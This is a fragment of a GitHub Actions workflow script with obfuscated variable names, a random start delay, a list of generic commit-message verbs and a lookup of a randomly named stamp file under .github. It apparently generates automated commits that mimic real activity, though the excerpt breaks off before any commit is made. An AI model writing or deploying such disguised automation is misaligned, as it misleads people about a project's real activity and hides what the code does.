        with:
          script: |
            await new Promise(r => setTimeout(r, Math.floor(Math.random() * 30000)));
            
            const jn = context.repo.owner;
            const feBs = ["fix", "update", "refactor", "add", "remove", "improve", "optimize", "feature", "bug", "docs", "test", "style", "merge", "cleanup", "adjust", "rename", "enhance", "replace", "format", "config", "release", "hotfix", "patch", "review", "sync", "rollback", "revert", "tweak", "implement", "validate", "check", "load", "save", "export", "import", "upgrade", "downgrade", "convert", "render", "parse", "compress", "encrypt", "decrypt", "log", "trace", "monitor", "analyze", "schedule", "retry", "notify"];
            const RN3gG = "main";
            const LilEC = ".github/dnMxlrEDLugoNv";
            const A0u4Z = context.repo.repo;
            
            async function S_f2() {
              try {
                const { data } = await github.rest.repos.getContent({
                  owner: jn, repo: A0u4Z, path: LilEC, ref: RN3gG,
                });
                if (Array.isArray(data)) throw new Error('stamp path is a directory');
